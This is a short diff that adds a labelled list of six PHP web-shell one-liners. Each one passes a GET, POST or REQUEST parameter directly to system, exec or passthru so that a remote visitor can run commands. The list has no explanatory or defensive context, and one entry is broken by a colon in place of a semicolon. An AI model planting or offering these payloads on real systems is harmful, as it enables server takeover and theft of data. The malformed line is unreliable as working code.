@@ -1,1 +1,8 @@
+PHP Web Shells:
 
+<?php system($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo system($_REQUEST['shell']): ?>
+<?php system($_REQUEST['cmd']); ?>
